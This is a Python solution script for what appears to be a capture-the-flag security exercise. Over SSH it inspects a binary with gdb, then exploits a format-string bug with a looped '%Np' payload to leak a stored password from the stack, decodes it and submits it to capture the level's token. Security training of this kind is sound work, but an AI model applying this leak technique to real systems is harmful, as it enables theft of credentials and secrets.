import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous
from utils.text import print_output, print_title, print_magic
from utils.base import save_token

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

output = exec(client, f'echo "test" | ./{binary_name}', title='Simple execute binary')
print_title('Okay, stdin intercepted, stdin write expected')
print_title('Send test in stdin')
print_output(output)
print_title("We need username and password")
print_magic('Debug Time!')

func_info = exec(
    client,
    f'echo "info func" | gdb ./{binary_name} -q | egrep "main"',
    title='Get all functions'
)
print_output(func_info)
print_title(
    'We have one entry point \n'
    '(0x0000000000400814 - main)'
)
print_title('Detailed view?')

main_structure = exec(
    client, f'echo "disass main" | gdb ./{binary_name} -q | egrep "148|493|591|630"',
    title='Get main structure'
)
print_output(main_structure)
print_title('Looks like main call open .pass file, compare stdin with content, print error or success and system call')
print_title('Try to printf vulnerability to obtain username and password offset, after we can access to buffer where '
            'stored read from file password')

output = exec(
    client,
    f'''for((i=0;i<100;i++)); do ./{binary_name} < <(python -c "print('Offset is $i '  + '%$i"'$'"p' )") ; done | 
    grep 'does not have access!\' | egrep " 21 | 22 | 23 | 24 | 25 | 26 | 27 " | sed "s/does not have access!//g"''',
    title='Some research stuf'
)
print_output(output)
print_title("5 consecutive entries in the buffer, looks like what we're looking for")
buffer_lines = [line.split(' ')[-1][2:] for line in output[1:-1]]
print_output(f'Cleaned hexes {", ".join(buffer_lines)}')

password = ""
for line in buffer_lines:
    output = exec(
        client, f'echo -n "{line}" | xxd -r -p | rev',
        title='Transform hex to ascii and reverse string to obtain password'
    )
    print_output(output)
    password = password + output[0]
print_output(password)
print_title('Gotcha! I hope it is our token, check it?')

output = exec(
    client,
    f'echo "test" | (echo "test"; echo "{password}"; cat -) | ./{binary_name}',
    title='Simple execute binary'
)
print_output(output)
print_title('Woo-hoo!')
save_token(password)
